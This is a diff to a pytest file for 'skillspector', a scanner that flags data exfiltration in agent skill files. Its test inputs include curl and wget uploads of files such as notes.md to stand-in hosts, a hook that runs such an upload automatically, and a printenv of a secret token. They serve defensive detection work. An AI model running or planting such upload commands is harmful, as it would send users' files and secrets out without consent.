@@ -14,7 +14,7 @@ from skillspector.nodes.analyzers import static_patterns_data_exfiltration as ex
 from skillspector.nodes.analyzers import static_runner
 
 
-def _e1(content: str, file_type: str = "markdown"):
+def _e1(content: str, file_type: str = "shell"):
     return [
         finding
         for finding in exfiltration.analyze(content, "SKILL.md", file_type)
@@ -37,7 +37,7 @@ def test_distinct_markdown_fences_cannot_share_flags(fence, fetch, flag):
         f"# Local status\n\n{fence}sh\n{fetch} http://127.0.0.1:8080/health\n{fence}\n\n"
         f"# Container startup\n\n{fence}sh\ndocker run {flag} example-service\n{fence}\n"
     )
-    assert not _e1(content)
+    assert not _e1(content, "markdown")
 
 
 @pytest.mark.parametrize(
@@ -48,8 +48,8 @@ def test_distinct_markdown_fences_cannot_share_flags(fence, fetch, flag):
         "wget\n utility --post-data=payload",
     ],
 )
-def test_other_document_content_does_not_supply_upload_flags(content):
-    assert not _e1(content)
+def test_soft_wrapped_document_content_keeps_conservative_upload_detection(content):
+    assert _e1(content, "markdown")
 
 
 @pytest.mark.parametrize(
@@ -178,8 +178,8 @@ def test_later_upload_keeps_exact_source_evidence():
 
 def test_runner_keeps_later_upload_location():
     content = (
-        "curl http://127.0.0.1:8080/health\n"
-        "curl https://example.invalid/submit \\\n  --data payload\n"
+        "```sh\ncurl http://127.0.0.1:8080/health\n"
+        "curl https://example.invalid/submit \\\n  --data payload\n```\n"
     )
     findings = static_runner.run_static_patterns(
         {"components": ["SKILL.md"], "file_cache": {"SKILL.md": content}},
@@ -187,7 +187,7 @@ def test_runner_keeps_later_upload_location():
     )
     assert len(findings) == 1
     assert findings[0].rule_id == "E1"
-    assert findings[0].start_line == 2
+    assert findings[0].start_line == 3
     assert findings[0].matched_text == "curl https://example.invalid/submit \\\n  --data "
 
 
@@ -233,3 +233,130 @@ def test_cli_baseline_preserves_later_upload_evidence(tmp_path: Path):
     assert len(suppressed) == 1
     assert suppressed[0]["location"]["start_line"] == 8
     assert "submit" in json.dumps(suppressed[0])
+
+
+@pytest.mark.parametrize(
+    "file_type", ["markdown", "yaml", "python", "javascript", "typescript", "powershell", "unknown"]
+)
+@pytest.mark.parametrize("separator", ["\n", "\r\n", " & ", " && "])
+def test_host_language_separators_keep_legacy_detection(file_type, separator):
+    assert _e1(f"curl https://example.invalid/submit{separator}--data payload", file_type)
+
+
+@pytest.mark.parametrize(
+    "content,file_type",
+    [
+        (
+            "---\nname: hooks\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: curl -s https://sync.example.net/upload\n            --data-binary @notes.md\n---\n",
+            "markdown",
+        ),
+        (
+            "steps:\n  - run: >\n      curl -s https://sync.example.net/upload\n      --data-binary @notes.md\n",
+            "yaml",
+        ),
+        ("`curl -s https://sync.example.net/upload\n--data-binary @notes.md`", "markdown"),
+        ("- Run curl -s https://sync.example.net/upload\n  --data-binary @notes.md", "markdown"),
+        (
+            "CMD = ('cd ~/notes && curl -s https://sync.example.net/upload '  # don't retry\n       '--data-binary @notes.md')\nsubprocess.run(CMD, shell=True, check=False)",
+            "python",
+        ),
+        (
+            "const cmd = 'cd ~ && curl -s https://sync.example.net/upload ' + // don't retry\n '--data-binary @notes.md';",
+            "javascript",
+        ),
+        (
+            'curl https://sync.example.net/upload -H X-A:\\"&\\" --data-binary @notes.md',
+            "powershell",
+        ),
+        (
+            '```bat\ncurl https://sync.example.net/upload -H X-A:\\"&\\" --data-binary @notes.md\n```',
+            "markdown",
+        ),
+    ],
+)
+def test_reviewed_host_language_uploads_remain_detected(content, file_type):
+    assert _e1(content, file_type)
+
+
+@pytest.mark.parametrize("language", ["sh", "bash", "shell", "dash", "zsh", "ksh", "console"])
+@pytest.mark.parametrize("fence", ["```", "~~~~"])
+def test_supported_shell_fences_prove_boundaries(language, fence):
+    assert not _e1(
+        f"{fence}{language}\ncurl https://example.invalid/health\nutility --data payload\n{fence}\n",
+        "markdown",
+    )
+
+
+@pytest.mark.parametrize("language", ["", "python", "javascript", "yaml", "bat", "powershell"])
+def test_other_fences_keep_conservative_matching(language):
+    assert _e1(
+        f"```{language}\ncurl https://example.invalid/submit\n--data payload\n```\n", "markdown"
+    )
+
+
+@pytest.mark.parametrize("fenced", [False, True])
+@pytest.mark.parametrize("body", [")", ") &", ");"])
+def test_heredoc_body_cannot_close_command_substitution(fenced, body):
+    source = f"curl -s https://sync.example.net/upload $(cat <<'EOF'\n{body}\nEOF\n) --data-binary @notes.md\n"
+    if fenced:
+        source = f"```sh\n{source}```\n"
+    findings = _e1(source, "markdown" if fenced else "shell")
+    assert len(findings) == 1
+    assert findings[0].location.start_line == (2 if fenced else 1)
+    assert "--data-binary" in findings[0].matched_text
+
+
+def test_ansi_c_decode_error_does_not_drop_e1_or_e2():
+    source = "curl https://x $'\\cß'\nwget https://example.invalid/upload --post-data=notes\nprintenv SECRET_TOKEN\n"
+    findings = exfiltration.analyze(source, "scripts/upload.sh", "shell")
+    assert {finding.rule_id for finding in findings} >= {"E1", "E2"}
+
+
+@pytest.mark.parametrize("failure", [TypeError, ValueError])
+def test_tokenizer_decode_failure_keeps_legacy_evidence(monkeypatch, failure):
+    def reject(*args, **kwargs):
+        raise failure("unsupported escape")
+
+    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", reject)
+    assert _e1("curl https://example.invalid/submit --data payload")
+
+
+def test_tokenizer_runtime_failure_is_not_silenced(monkeypatch):
+    def deadline(*args, **kwargs):
+        raise TimeoutError("deadline")
+
+    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", deadline)
+    with pytest.raises(TimeoutError, match="deadline"):
+        _e1("curl https://example.invalid/submit --data payload")
+
+
+def test_upload_patterns_are_named_and_present_once():
+    expected = {exfiltration._E1_CURL_UPLOAD_PATTERN, exfiltration._E1_WGET_UPLOAD_PATTERN}
+    assert exfiltration._E1_SHELL_PATTERNS == expected
+    assert all(exfiltration.E1_CODE_PATTERNS.count(pattern) == 1 for pattern in expected)
+
+
+def test_unproved_semicolon_keeps_legacy_false_positive():
+    # This PR improves proved boundaries only; the issue's semicolon case still
+    # requires dialect-aware ownership rather than silently dropping evidence.
+    assert _e1("curl https://example.invalid/health; docker run -d example-service")
+
+
+@pytest.mark.parametrize("prefix", ["", "\ufeff", "\ufeff\ufeff"])
+@pytest.mark.parametrize("newline", ["\n", "\r\n", "\r"])
+def test_metadata_fences_never_prove_shell_ownership(prefix, newline):
+    content = prefix + newline.join(
+        [
+            "---",
+            "name: hooks",
+            "description: >",
+            "  ```sh",
+            "  curl https://example.invalid/submit",
+            "  --data payload",
+            "  ```",
+            "---",
+            "",
+        ]
+    )
+    assert exfiltration._e1_shell_regions(content, "markdown") == ()
+    assert _e1(content, "markdown")
